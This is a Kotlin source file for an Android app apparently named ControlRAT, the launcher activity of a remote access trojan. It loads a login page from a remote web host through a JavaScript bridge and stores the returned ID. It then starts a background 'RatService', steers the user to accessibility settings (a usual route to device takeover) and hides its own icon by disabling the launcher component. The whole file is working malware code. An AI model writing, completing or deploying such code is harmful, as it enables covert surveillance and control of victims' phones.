package com.controlrat
import android.app.Activity
import android.content.Intent
import android.os.Bundle
import android.webkit.JavascriptInterface
import android.webkit.WebView
import android.webkit.WebViewClient
import android.provider.Settings

class MainActivity : Activity() {
    override fun onCreate(b: Bundle?) {
        super.onCreate(b)
        val prefs = getSharedPreferences("rat_pref", MODE_PRIVATE)
        if (prefs.getString("app_id", "unknown") != "unknown") {
            startForegroundService(Intent(this, RatService::class.java))
            openAccessibilitySettings()
            hideAppAndFinish()
        } else {
            showLoginWebView()
        }
    }

    private fun showLoginWebView() {
        val webView = WebView(this)
        webView.settings.javaScriptEnabled = true
        webView.addJavascriptInterface(object {
            @JavascriptInterface
            fun onLoginSuccess(uid: String) {
                getSharedPreferences("rat_pref", MODE_PRIVATE).edit().putString("app_id", uid).apply()
                startForegroundService(Intent(this@MainActivity, RatService::class.java))
                openAccessibilitySettings()
                hideAppAndFinish()
            }
        }, "AndroidBridge")
        webView.webViewClient = WebViewClient()
        webView.loadUrl("https://remoterat-a26e4.web.app/vip.html?mobile=true")
        setContentView(webView)
    }

    private fun openAccessibilitySettings() {
        try {
            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
        } catch (e: Exception) {}
    }

    private fun hideAppAndFinish() {
        packageManager.setComponentEnabledSetting(
            android.content.ComponentName(this, MainActivity::class.java),
            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            android.content.pm.PackageManager.DONT_KILL_APP
        )
        finishAffinity()
    }
}
